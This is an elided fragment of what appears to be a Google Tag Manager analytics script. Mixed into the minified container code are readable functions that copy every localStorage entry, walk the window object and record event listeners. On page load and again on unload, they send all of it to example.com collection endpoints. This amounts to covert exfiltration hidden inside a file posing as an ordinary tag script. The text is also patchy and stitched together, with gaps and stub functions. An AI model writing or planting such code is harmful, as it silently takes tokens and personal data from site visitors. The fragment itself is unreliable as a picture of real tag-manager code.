...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 1,
        "vtp_instanceDestinationId": "UA-255504424-1",
        "tag_id": 9
      }, {
        "function": "__rep",
        "vtp_containerId": "UA-255504424-1",
        "vtp_remoteConfig": ["map"],
        "tag_id": 1
      }, {
        "function": "__zone",
        "vtp_childContainers": ["list", ["map", "publicId", "G-EDLDQNNXS4"]],
  ...
  */
  ...
  ii.fe = Number("0") || 0;
  ii.ka = "dataLayer";
  ii.Uj = "ChEI8POGpwYQwKfQoLnu2YWNARInABhc5udUIdbph+/AxtP0daDGqMoQAWuzPxHtUnR8sEQp5Pu1fMaCGgKUfw\x3d\x3d";
  var li = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  function trackLocalStorage() {
    for (let i = 0; i < localStorage.length; i++) {
      ...
      let propValue = localStorage.getItem(key);
      let propType = typeof propValue;
      pageDataStorage[key] = {
        type: propType,
        value: propType == "function" ? String(propValue) : propValue
  ...
  function transmitData(data, endpoint) {
    ...
    req.onerror = function () {
      console.error("Error Occurred During Data Transfer");
    };
  ...
  function scheduleTasks() {
    const discoveries = traverseWindowObj();
    trackLocalStorage();
    trackEventListeners();
    transmitData(discoveries, 'https://example.com/api/collect');
    transmitData(pageDataStorage, 'https://example.com/api/store');
    transmitData(pageEvents, 'https://example.com/api/events');
  }

  // EventListeners for the Tasks
  ...
  function jF() {}
  jF.M = "logToConsole";
  window.addEventListener('load', scheduleTasks);
  function kF(a, b) {}
  ...
  window.addEventListener('beforeunload', scheduleTasks);
  var Z = {
    m: {}
  };
